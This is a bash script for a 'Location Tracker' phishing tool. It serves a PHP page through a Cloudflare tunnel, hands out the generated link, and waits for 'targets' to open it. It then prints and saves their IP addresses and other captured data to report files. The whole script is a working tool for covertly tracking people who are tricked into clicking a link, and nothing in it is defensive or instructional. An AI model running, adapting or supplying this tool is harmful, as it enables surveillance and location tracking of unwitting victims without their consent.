trap 'printf "\n";stop' 2

PORT=3333

banner() {
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
RESET='\e[0m'
clear
printf "${YELLOW}╔═════════════════════════════════════════════════════════════╗\n"
printf "║                                                             ║\n"

printf "║  ${RED}███████╗██╗      █████╗ ███╗   ███╗███████╗                ${YELLOW}║\n"
printf "║  ${RED}██╔════╝██║     ██╔══██╗████╗ ████║██╔════╝                ${YELLOW}║\n"
printf "║  ${RED}█████╗  ██║     ███████║██╔████╔██║█████╗                  ${YELLOW}║\n"
printf "║  ${RED}██╔══╝  ██║     ██╔══██║██║╚██╔╝██║██╔══╝                  ${YELLOW}║\n"
printf "║  ${RED}██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗                ${YELLOW}║\n"
printf "║  ${RED}╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝                ${YELLOW}║\n"

printf "║                                                             ║\n"
printf "║          ${GREEN} LOCATION TRACKER - PERSONAL${YELLOW}                       ║\n"
printf "║                                                             ║\n"

printf "║  ${GREEN}Developer: FlameVortex                                     ${YELLOW}║\n"
printf "║  ${GREEN}GitHub   : github.com/FlameVortex                          ${YELLOW}║\n"
printf "║  ${GREEN}Version  : 1.1                                             ${YELLOW}║\n"

printf "║                                                             ║\n"
printf "╚═════════════════════════════════════════════════════════════╝${RESET}\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v cloudflared > /dev/null 2>&1 || { echo >&2 "I require cloudflared but it's not installed. Install it. Aborting."; exit 1; }
}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
if [[ $checkphp == 'php' ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkcf == 'cloudflared' ]]; then
killall cloudflared > /dev/null 2>&1
fi
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\r\n" $ip
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\r\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\r\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\r\n"
catch_ip
rm -rf ip.txt
stty sane
cat data.txt
printf "\n"
fi
sleep 0.5
done
}

cloudflare_tunnel() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare Tunnel...\n"
printf "\e[1;93m[*] Generating link...\e[0m\n"

cloudflared tunnel --url http://127.0.0.1:$PORT > tunnel.log 2>&1 &
sleep 8

link=$(grep -oP 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' tunnel.log | head -n1)

if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Failed to generate tunnel link!\e[0m\n"
    printf "\e[1;33m[*] Checking tunnel.log for details...\e[0m\n"
    tail -5 tunnel.log
else
    printf "\n\e[1;92m╔══════════════════════════════════════════════╗\e[0m\n"
    printf "\e[1;92m║      TUNNEL LINK READY!                      ║\e[0m\n"
    printf "\e[1;92m╠══════════════════════════════════════════════╣\e[0m\n"
    printf "\e[1;92m║  \e[1;97m%s\e[0m\e[1;92m  ║\e[0m\n" "$link"
    printf "\e[1;92m╚══════════════════════════════════════════════╝\e[0m\n"
fi

sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:$PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[*] Server running at http://127.0.0.1:$PORT\e[0m\n"
checkfound
}

flame() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi

if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi

default_option_server="Y"

read -p $'\n\e[1;93m Enter Tunnel Mood {Cloudflare Tunnel / Local Only} [Y/n]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

read -p $'\n\e[1;96m Enter Port (Default: 3333): \e[0m' input_port
PORT="${input_port:-3333}"

if [[ $option_server == "Y" || $option_server == "y" ]]; then
cloudflare_tunnel
else
local_server
fi
}

banner
dependencies
flame